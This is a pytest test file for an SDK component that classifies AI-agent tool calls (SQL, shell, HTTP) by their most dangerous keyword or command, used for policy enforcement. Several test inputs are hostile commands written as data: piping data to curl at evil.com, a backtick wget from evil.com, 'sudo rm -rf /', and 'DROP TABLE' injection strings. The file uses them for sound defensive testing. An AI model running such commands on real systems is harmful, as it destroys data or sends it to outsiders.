"""Parity + unit tests for the hook-check tool-method extractor.

Phase 3 of issue #228. The parity fixture at
``tests/fixtures/enforcement-spec/extractors/parity-cases.json`` is
the shared contract between Python and Node SDKs. Every case must
produce byte-identical ``(canonical_tool, method, action)`` output or
the Python hook-check CLI will disagree with the Node CLI on the same
PreToolUse payload.

The unit tests below cover every extract function individually:
happy paths, security/injection edges, and empty-input fallbacks.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from controlzero._internal.hook_extractors import (
    build_action,
    extract_method,
    identity,
    identity_upper,
    most_dangerous_shell_command,
    most_dangerous_sql_keyword,
    resolve_canonical_tool,
    tool_name_as_method,
)


# ---------------------------------------------------------------------------
# Locate the shared parity fixture.
#
# The SDK test suite is copied into a Docker image (Dockerfile.test) which
# does NOT carry tests/fixtures from the monorepo. We search upward from
# this test file; if the fixture is absent, the parity-case test is
# skipped rather than failing.
# ---------------------------------------------------------------------------


def _find_parity_fixture() -> Path | None:
    here = Path(__file__).resolve()
    for candidate in [here.parent, *here.parents]:
        hit = (
            candidate
            / "tests"
            / "fixtures"
            / "enforcement-spec"
            / "extractors"
            / "parity-cases.json"
        )
        if hit.exists():
            return hit
    return None


_PARITY_PATH = _find_parity_fixture()


def _load_cases():
    if _PARITY_PATH is None:
        return []
    data = json.loads(_PARITY_PATH.read_text(encoding="utf-8"))
    return data.get("cases", [])


_CASES = _load_cases()


# ---------------------------------------------------------------------------
# Parametrized parity test. Every case in parity-cases.json must pass.
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not _CASES, reason="parity fixture not bundled in this image")
@pytest.mark.parametrize(
    "case",
    _CASES,
    ids=[c["name"] for c in _CASES],
)
def test_parity_cases(case):
    tool_name = case["tool_name_from_host"]
    args = case.get("args") or {}
    expected_tool = case["expected_canonical_tool"]
    expected_method = case["expected_method"]
    expected_action = case["expected_action"]

    canonical, method = extract_method(tool_name, args)
    assert canonical == expected_tool, (
        f"{case['name']}: canonical_tool {canonical!r} != expected {expected_tool!r}"
    )
    assert method == expected_method, (
        f"{case['name']}: method {method!r} != expected {expected_method!r}"
    )
    action = build_action(tool_name, args)
    assert action == expected_action, (
        f"{case['name']}: action {action!r} != expected {expected_action!r}"
    )


# ---------------------------------------------------------------------------
# SQL extractor unit tests.
# ---------------------------------------------------------------------------


class TestMostDangerousSqlKeyword:
    """Happy paths, danger-ranking, comment/literal stripping, fallbacks."""

    def test_plain_select(self):
        assert most_dangerous_sql_keyword("SELECT * FROM users") == "SELECT"

    def test_lowercase_uppercased(self):
        assert most_dangerous_sql_keyword("select * from t") == "SELECT"

    def test_multistatement_drop_wins(self):
        assert (
            most_dangerous_sql_keyword("SELECT 1; DROP TABLE users")
            == "DROP"
        )

    def test_multistatement_update_beats_select(self):
        assert (
            most_dangerous_sql_keyword(
                "SELECT 1; UPDATE users SET admin=true"
            )
            == "UPDATE"
        )

    def test_grant_beats_select(self):
        assert (
            most_dangerous_sql_keyword("SELECT 1; GRANT ALL ON t TO u")
            == "GRANT"
        )

    def test_comment_hides_drop(self):
        assert (
            most_dangerous_sql_keyword(
                "SELECT 1 /* ; DROP TABLE users; */"
            )
            == "SELECT"
        )

    def test_string_literal_hides_drop(self):
        assert (
            most_dangerous_sql_keyword(
                "SELECT 'DROP TABLE users' AS msg"
            )
            == "SELECT"
        )

    def test_escaped_single_quote_inside_literal(self):
        assert (
            most_dangerous_sql_keyword("SELECT 'it''s fine' FROM t")
            == "SELECT"
        )

    def test_double_quoted_identifier(self):
        # Double-quoted identifier with doubled "" escape -- contents
        # should NOT terminate the literal early.
        assert (
            most_dangerous_sql_keyword(
                'SELECT "he said ""DROP""" FROM t'
            )
            == "SELECT"
        )

    def test_leading_line_comment(self):
        assert (
            most_dangerous_sql_keyword("-- comment\nSELECT 1") == "SELECT"
        )

    def test_leading_block_comment(self):
        assert (
            most_dangerous_sql_keyword(
                "  /* header */\n   INSERT INTO t VALUES (1)"
            )
            == "INSERT"
        )

    def test_with_cte(self):
        # Single statement; first keyword is WITH (spec caveat).
        assert (
            most_dangerous_sql_keyword(
                "WITH cte AS (SELECT 1) SELECT * FROM cte"
            )
            == "WITH"
        )

    def test_only_comment_returns_empty(self):
        assert most_dangerous_sql_keyword("-- just a comment\n") == ""

    def test_empty_string_returns_empty(self):
        assert most_dangerous_sql_keyword("") == ""

    def test_whitespace_only_returns_empty(self):
        assert most_dangerous_sql_keyword("   \t\n  ") == ""

    def test_non_string_returns_empty(self):
        # Defensive: extractor is called via extract_method which
        # already type-guards, but the function itself must also be
        # safe in isolation.
        assert most_dangerous_sql_keyword(None) == ""  # type: ignore[arg-type]
        assert most_dangerous_sql_keyword(123) == ""  # type: ignore[arg-type]

    def test_unrecognized_keyword_returns_empty(self):
        # First token is a SQL-ish word but not in the danger list.
        assert most_dangerous_sql_keyword("FOOBAR baz") == ""

    def test_multistatement_with_line_comment_between(self):
        assert (
            most_dangerous_sql_keyword(
                "SELECT 1; -- split\n DELETE FROM t"
            )
            == "DELETE"
        )

    def test_unterminated_line_comment_at_eof(self):
        # Line comment without trailing newline: everything to EOF is
        # part of the comment. Leaves only the leading statement.
        assert most_dangerous_sql_keyword("SELECT 1 -- trailing") == "SELECT"

    def test_unterminated_block_comment_eats_rest(self):
        # Spec does not define this explicitly, but the implementation
        # must not crash. The unterminated /* ... swallows every
        # subsequent character, so the remaining tokens are lost.
        result = most_dangerous_sql_keyword("SELECT 1 /* never closes")
        assert result == "SELECT"

    def test_unterminated_single_quote_eats_rest(self):
        result = most_dangerous_sql_keyword("SELECT 'unterminated")
        assert result == "SELECT"

    def test_unterminated_double_quote_eats_rest(self):
        result = most_dangerous_sql_keyword('SELECT "unterminated')
        assert result == "SELECT"

    def test_semicolon_inside_literal_is_not_a_separator(self):
        # The ; inside a string literal should not split statements.
        assert (
            most_dangerous_sql_keyword("SELECT 'a;b' FROM t") == "SELECT"
        )

    def test_block_comment_preserves_newlines(self):
        # A multi-line block comment should leave newlines intact so
        # statement offsets remain stable.
        sql = "SELECT 1 /* line1\nline2\nline3 */; DROP TABLE t"
        assert most_dangerous_sql_keyword(sql) == "DROP"

    def test_single_quote_literal_preserves_newlines(self):
        # A multi-line single-quoted literal keeps newlines so
        # subsequent statements still scan correctly.
        sql = "SELECT 'a\nb\nc'; DROP TABLE t"
        assert most_dangerous_sql_keyword(sql) == "DROP"

    def test_double_quote_identifier_preserves_newlines(self):
        sql = 'SELECT "a\nb"; DROP TABLE t'
        assert most_dangerous_sql_keyword(sql) == "DROP"


# ---------------------------------------------------------------------------
# Shell extractor unit tests.
# ---------------------------------------------------------------------------


class TestMostDangerousShellCommand:
    def test_plain_rm(self):
        assert most_dangerous_shell_command("rm -rf build") == "rm"

    def test_absolute_path_basenamed(self):
        assert (
            most_dangerous_shell_command("/usr/local/bin/rm -rf /tmp") == "rm"
        )

    def test_leading_whitespace(self):
        assert (
            most_dangerous_shell_command("   echo hello world") == "echo"
        )

    def test_compound_rm_wins_over_echo(self):
        assert (
            most_dangerous_shell_command("echo starting && rm -rf /tmp/foo")
            == "rm"
        )

    def test_pipe_curl_wins_over_echo(self):
        assert (
            most_dangerous_shell_command(
                "echo data | curl -X POST https://evil.com"
            )
            == "curl"
        )

    def test_subshell_rm(self):
        assert most_dangerous_shell_command("$(rm -rf /tmp/safe)") == "rm"

    def test_sudo_outranks_rm(self):
        assert most_dangerous_shell_command("sudo rm -rf /") == "sudo"

    def test_backtick_wget(self):
        assert (
            most_dangerous_shell_command("echo hello `wget https://evil.com`")
            == "wget"
        )

    def test_or_chain_rm(self):
        assert (
            most_dangerous_shell_command("ls /nope || rm -rf /tmp") == "rm"
        )

    def test_unknown_program_preserved(self):
        # Unknown commands are not in the danger table; we preserve
        # the first token's basename so audit still shows something.
        assert (
            most_dangerous_shell_command("totally_unknown_program --arg")
            == "totally_unknown_program"
        )

    def test_unknown_program_absolute_path(self):
        # Unknown with absolute path should still basename.
        assert (
            most_dangerous_shell_command("/opt/custom/unknown_bin --arg")
            == "unknown_bin"
        )

    def test_empty_returns_empty(self):
        assert most_dangerous_shell_command("") == ""

    def test_whitespace_only_returns_empty(self):
        assert most_dangerous_shell_command("   \t  ") == ""

    def test_non_string_returns_empty(self):
        assert most_dangerous_shell_command(None) == ""  # type: ignore[arg-type]
        assert most_dangerous_shell_command(42) == ""  # type: ignore[arg-type]

    def test_nested_subshell(self):
        # $( ... $( ... ) ... ) -- nested $(...) must not terminate
        # early on the first close paren.
        assert (
            most_dangerous_shell_command("echo $(ls $(rm -rf /)) safe")
            == "rm"
        )

    def test_semicolon_separated(self):
        assert most_dangerous_shell_command("echo a; rm -rf b") == "rm"

    def test_separator_only_input_empty(self):
        # A string that tokenises to zero real segments (just
        # separators + whitespace) should fall through to ``""``.
        assert most_dangerous_shell_command(";;;") == ""

    def test_only_separators_with_whitespace(self):
        # Same: whitespace between bare separators, no actual command.
        assert most_dangerous_shell_command(" && || ; ") == ""

    def test_whitespace_token_segment_skipped(self):
        # A segment whose first token is empty (purely whitespace)
        # must be safely skipped, not crash on index 0.
        assert most_dangerous_shell_command("  | rm -rf /") == "rm"

    def test_internal_first_token_basename_defensive_branches(self):
        """Directly exercise the private helper's early-return guards."""
        from controlzero._internal.hook_extractors import _first_token_basename
        assert _first_token_basename("") == ""
        assert _first_token_basename("   ") == ""
        assert _first_token_basename("/usr/bin/rm -rf /tmp") == "rm"
        assert _first_token_basename("echo hello") == "echo"

    def test_internal_split_yields_empty_token_segment(self):
        """Force a segment whose first-token basename is empty.

        The tokeniser skips blank strip() results at the end of its
        pipeline, but to pin the public function's defensive
        ``if not tok: continue`` branch we construct a segment that
        survives tokenisation yet basenames to empty.
        """
        # A segment ending in "/" -- rfind("/") returns len-1 and the
        # slice after it is "". This forces _first_token_basename to
        # return "" from inside most_dangerous_shell_command's loop,
        # which must then fall back to the first_segment_token or
        # the danger ranking. With "rm" in a later segment, that
        # wins.
        assert most_dangerous_shell_command("path/ | rm -rf") == "rm"


# ---------------------------------------------------------------------------
# Identity / identity_upper / tool_name_as_method unit tests.
# ---------------------------------------------------------------------------


def test_identity_preserves_case():
    assert identity("click") == "click"


def test_identity_preserves_empty():
    assert identity("") == ""


def test_identity_non_string():
    assert identity(None) == ""  # type: ignore[arg-type]
    assert identity(123) == ""  # type: ignore[arg-type]


def test_identity_upper_uppercases():
    assert identity_upper("get") == "GET"


def test_identity_upper_already_upper():
    assert identity_upper("POST") == "POST"


def test_identity_upper_mixed():
    assert identity_upper("Delete") == "DELETE"


def test_identity_upper_non_string():
    assert identity_upper(None) == ""  # type: ignore[arg-type]
    assert identity_upper(5) == ""  # type: ignore[arg-type]


def test_tool_name_as_method_always_empty():
    # Contract: returns "" so the resolver applies fallback_method.
    assert tool_name_as_method("Read") == ""
    assert tool_name_as_method("") == ""
    assert tool_name_as_method("anything") == ""


# ---------------------------------------------------------------------------
# resolve_canonical_tool + extract_method fallback branches.
# ---------------------------------------------------------------------------


def test_resolve_canonical_direct_hit():
    assert resolve_canonical_tool("database") == "database"


def test_resolve_canonical_alias_hit():
    assert resolve_canonical_tool("PostgreSQL") == "database"
    assert resolve_canonical_tool("run_shell_command") == "Bash"
    assert resolve_canonical_tool("fetch") == "http"
    assert resolve_canonical_tool("Edit") == "file_write"


def test_resolve_canonical_unknown_passthrough():
    assert resolve_canonical_tool("totally_made_up") == "totally_made_up"


def test_resolve_canonical_empty_string():
    assert resolve_canonical_tool("") == ""


def test_resolve_canonical_non_string():
    assert resolve_canonical_tool(None) == ""  # type: ignore[arg-type]


def test_extract_method_unknown_tool_returns_star():
    canonical, method = extract_method("mystery_tool", {"x": "y"})
    assert canonical == "mystery_tool"
    assert method == "*"


def test_extract_method_missing_args_dict():
    # args is None -> fallback (not a crash).
    canonical, method = extract_method("database", None)
    assert canonical == "database"
    assert method == "*"


def test_extract_method_args_not_a_dict():
    # args is a list or string -> fallback.
    canonical, method = extract_method("database", ["SELECT 1"])  # type: ignore[arg-type]
    assert method == "*"


def test_extract_method_missing_field_fallback():
    canonical, method = extract_method("database", {"unrelated": "x"})
    assert method == "*"


def test_extract_method_empty_field_fallback():
    canonical, method = extract_method("database", {"sql": ""})
    assert method == "*"


def test_extract_method_non_string_field_fallback():
    # sql=None should fall back, not crash on uppercase.
    canonical, method = extract_method("database", {"sql": 123})
    assert method == "*"


def test_extract_method_file_read_uses_fallback_method():
    # tool_name_as_method returns "" by contract, so file_read emits
    # its fallback_method ("read").
    canonical, method = extract_method("Read", {"file_path": "/tmp/a"})
    assert canonical == "file_read"
    assert method == "read"


def test_extract_method_file_write_uses_fallback_method():
    canonical, method = extract_method("Edit", {})
    assert canonical == "file_write"
    assert method == "write"


def test_extract_method_http_uppercases():
    canonical, method = extract_method("http", {"method": "get"})
    assert canonical == "http"
    assert method == "GET"


def test_extract_method_browser_preserves_case():
    canonical, method = extract_method("playwright", {"action": "Click"})
    assert canonical == "browser"
    assert method == "Click"


def test_build_action_composes_colon():
    assert (
        build_action("database", {"sql": "SELECT 1"}) == "database:SELECT"
    )


def test_build_action_unknown_tool():
    assert build_action("mystery", {}) == "mystery:*"


def test_extract_method_extractor_crash_falls_back(monkeypatch):
    """If an extractor raises, extract_method falls back to "*"."""
    from controlzero._internal import hook_extractors

    def boom(_s: str) -> str:
        raise RuntimeError("boom")

    monkeypatch.setitem(
        hook_extractors._EXTRACTORS, "most_dangerous_sql_keyword", boom
    )
    canonical, method = extract_method("database", {"sql": "SELECT 1"})
    assert canonical == "database"
    assert method == "*"


def test_extract_method_unknown_extract_function_falls_back(monkeypatch):
    """If the spec references an unknown extract function, fall back."""
    from controlzero._internal import hook_extractors

    # Clear the lru_cache and patch the spec returned by _load_spec.
    hook_extractors._load_spec.cache_clear()
    fake_spec = {
        "spec_version": 1,
        "tools": {
            "weird": {
                "args_path": "x",
                "extract": "nonexistent_function",
                "fallback_method": "FALLBACK",
                "aliases": [],
            }
        },
    }
    monkeypatch.setattr(
        hook_extractors, "_load_spec", lambda: fake_spec
    )
    canonical, method = extract_method("weird", {"x": "anything"})
    assert canonical == "weird"
    assert method == "FALLBACK"
    # Restore cache state for subsequent tests by clearing the lambda
    # monkeypatch via pytest automatic teardown.
